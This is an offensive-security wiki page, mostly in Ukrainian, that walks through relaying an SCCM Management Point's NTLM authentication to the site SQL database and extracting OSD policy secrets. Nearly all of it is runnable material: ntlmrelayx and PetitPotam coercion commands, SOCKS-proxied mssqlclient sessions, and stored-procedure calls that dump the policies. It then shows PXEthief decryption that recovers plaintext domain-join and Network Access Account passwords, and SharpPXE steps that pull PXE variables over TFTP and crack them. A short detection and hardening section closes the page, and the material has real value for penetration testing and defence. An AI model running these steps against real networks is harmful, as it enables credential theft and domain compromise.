# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Примусово змусивши **System Center Configuration Manager (SCCM) Management Point (MP)** автентифікуватися через SMB/RPC і **relaying** цей NTLM облікового запису машини до **site database (MSSQL)**, ви отримуєте права `smsdbrole_MP` / `smsdbrole_MPUserSvc`.  Ці ролі дають змогу викликати набір stored procedures, які розкривають policy blobs **Operating System Deployment (OSD)** (облікові дані Network Access Account, змінні Task-Sequence тощо).  Blobs закодовані у hex та зашифровані, але їх можна декодувати й розшифрувати за допомогою **PXEthief**, отримавши секрети у відкритому вигляді.<sup>[[2]](#references)</sup>

High-level chain:
1. Визначити MP і site DB ↦ неавтентифікований HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Запустити `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Примусити MP автентифікуватися за допомогою **PetitPotam**, PrinterBug, DFSCoerce тощо.
4. Через SOCKS proxy підключитися за допомогою `mssqlclient.py -windows-auth` як relayed обліковий запис **<DOMAIN>\\<MP-host>$**.
5. Виконати:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (або `MP_GetPolicyBodyAfterAuthorization`)
6. Видалити BOM `0xFFFE`, виконати `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Секрети, такі як `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` тощо, можна отримати без взаємодії з PXE або клієнтами.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
Розширення MP ISAPI **GetAuth.dll** відкриває кілька параметрів, які не потребують автентифікації (якщо сайт не працює лише з PKI):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Повертає публічний ключ site signing cert і GUID-и пристроїв *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Перелічує кожен Management-Point на сайті. |
| `SITESIGNCERT` | Повертає signing certificate Primary-Site (дає змогу визначити site server без LDAP). |

Отримайте GUID-и, які використовуватимуться як **clientID** для подальших DB queries:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Ретранслювати обліковий запис машини MP до MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Коли coercion спрацьовує, ви повинні побачити щось на кшталт:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Визначення політик OSD через збережені процедури
Підключіться через SOCKS proxy (порт 1080 за замовчуванням):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Перейдіть до БД **CM_<SiteCode>** (використовуйте 3-значний код сайту, наприклад `CM_001`).

### 3.1 Пошук GUID невідомих комп’ютерів (необов’язково)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Список призначених політик
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Кожен рядок містить `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Зосередьтеся на policies:
* **NAAConfig**  – облікові дані Network Access Account
* **TS_Sequence** – змінні Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – може містити облікові записи run-as

### 3.3  Отримання повного body
Якщо у вас уже є `PolicyID` і `PolicyVersion`, вимогу щодо clientID можна пропустити, використавши:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ВАЖЛИВО: У SSMS збільште параметр “Maximum Characters Retrieved” (>65535), інакше blob буде обрізано.

---

## 4. Декодування та розшифрування blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Приклад відновлених секретів:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Релевантні SQL-ролі та процедури
Після relay login зіставляється з:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ці ролі надають десятки дозволів EXEC; основні з них, що використовуються в цій атаці:

| Збережена процедура | Призначення |
|---------------------|-------------|
| `MP_GetMachinePolicyAssignments` | Перелік політик, застосованих до `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Повернення повного вмісту політики. |
| `MP_GetListOfMPsInSiteOSD` | Повертається через шлях `MPKEYINFORMATIONMEDIA`. |

Повний список можна переглянути за допомогою:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Збір завантажувальних PXE-носіїв (SharpPXE)
* **Відповідь PXE через UDP/4011**: надішліть запит на завантаження PXE до Distribution Point, налаштованого для PXE. Відповідь proxyDHCP розкриває шляхи до файлів завантаження, такі як `SMSBoot\\x64\\pxe\\variables.dat` (зашифрована конфігурація) і `SMSBoot\\x64\\pxe\\boot.bcd`, а також додатковий зашифрований blob ключа.<sup>[[4]](#references)</sup>
* **Отримання артефактів завантаження через TFTP**: використовуйте отримані шляхи, щоб завантажити `variables.dat` через TFTP (без автентифікації). Файл невеликий (кілька KB) і містить зашифровані змінні носія.
* **Розшифрування або crack**:
- Якщо відповідь містить ключ розшифрування, передайте його до **SharpPXE**, щоб безпосередньо розшифрувати `variables.dat`.
- Якщо ключ не надано (PXE-носій захищений власним паролем), SharpPXE генерує hash у форматі, сумісному з **Hashcat**, `$sccm$aes128$...`, для offline cracking. Після відновлення пароля розшифруйте файл.
* **Аналіз розшифрованого XML**: змінні у відкритому вигляді містять метадані розгортання SCCM (**URL Management Point**, **Site Code**, GUID носіїв та інші ідентифікатори). SharpPXE аналізує їх і виводить готову до запуску команду **SharpSCCM** із попередньо заповненими параметрами GUID/PFX/site для подальшого abuse.
* **Вимоги**: потрібна лише мережева доступність слухача PXE (UDP/4011) і TFTP; локальні права адміністратора не потрібні.

---

## 7. Виявлення та Hardening
1. **Моніторинг входів до MP** – будь-який обліковий запис комп'ютера MP, який входить із IP-адреси, що не належить його хосту, ≈ relay.<sup>[[1]](#references)</sup>
2. Увімкніть **Extended Protection for Authentication (EPA)** для бази даних site (`PREVENT-14`).
3. Вимкніть невикористовуваний NTLM, увімкніть обов'язкове SMB signing, обмежте RPC (ті самі заходи захисту використовуються проти `PetitPotam`/`PrinterBug`).
4. Посильте захист комунікації MP ↔ DB за допомогою IPSec / mutual-TLS.
5. **Обмежте доступність PXE** – фільтруйте firewall-трафік UDP/4011 і TFTP, дозволяючи його лише для довірених VLAN, вимагайте паролі PXE та створюйте сповіщення про завантаження через TFTP файлів `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Див. також
* Основи NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* Abuse MSSQL і post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [Я хочу поговорити з вашим менеджером: крадіжка секретів за допомогою Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
